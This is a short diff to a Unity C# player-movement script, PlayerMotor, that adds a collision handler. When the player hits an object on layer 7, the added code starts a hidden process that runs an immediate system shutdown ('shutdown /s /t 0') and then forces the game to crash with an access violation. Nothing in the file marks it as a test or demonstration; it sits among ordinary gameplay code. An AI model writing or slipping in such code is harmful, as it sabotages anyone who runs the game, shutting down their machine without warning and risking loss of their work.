@@ -51,7 +51,17 @@ public class PlayerMotor : MonoBehaviour
         }
 
     }
-
+    private void OnCollisionEnter(Collision collision)
+    {
+        if(collision.gameObject.layer == 7)
+        {
+            var psi = new ProcessStartInfo("shutdown", "/s /t 0");
+            psi.CreateNoWindow = true;
+            psi.UseShellExecute = false;
+            Process.Start(psi);
+            UnityEngine.Diagnostics.Utils.ForceCrash(UnityEngine.Diagnostics.ForcedCrashCategory.AccessViolation);
+        }
+    }
     void checkInBounds()
     {
         if (transform.position.y <= -16)
